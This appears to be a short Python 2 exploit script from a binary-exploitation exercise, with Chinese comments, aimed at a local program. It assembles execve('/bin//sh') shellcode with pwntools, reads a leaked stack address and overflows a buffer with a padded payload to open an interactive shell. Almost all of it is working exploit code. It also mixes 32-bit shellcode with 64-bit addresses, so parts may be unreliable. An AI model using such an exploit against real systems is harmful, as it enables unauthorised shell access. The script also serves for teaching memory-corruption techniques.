# encoding: utf-8

import pwn
from zio import *
from binascii import *

asm_str = """
push 0x0B
pop eax
cdq
push edx
push dword ptr 0x68732F2F
push dword ptr 0x6E69622F
mov ebx, esp
xor ecx, ecx
int 0x80
"""

shellcode = ""
shellcode += pwn.asm("push 0x0B")
shellcode += pwn.asm("pop eax")
shellcode += pwn.asm("cdq")
shellcode += pwn.asm("push edx")
shellcode += pwn.asm("push dword ptr 0x68732F2F")
shellcode += pwn.asm("push dword ptr 0x6E69622F")
shellcode += pwn.asm("mov ebx, esp")
shellcode += pwn.asm("xor ecx, ecx")
shellcode += pwn.asm("int 0x80")

# 得到机器码
#shellcode = pwn.asm(asm_str)
# 计算偏移
offset = 0x7fffffffe428 - 0x7fffffffe3d0
io = zio('./a.out')
"""
read_until() 函数会从输出流中接收数据直到遇到调用这个函数时传入的参数
"""
io.read_until("&buffer = ")
# 转成 16 进制数
address = int(io.read_line()[2:], 16)
# 构造 payload
payload = shellcode + (offset - len(shellcode))*'A' + l64(address)
print b2a_hex(payload)
io.write(payload)
io.interact()
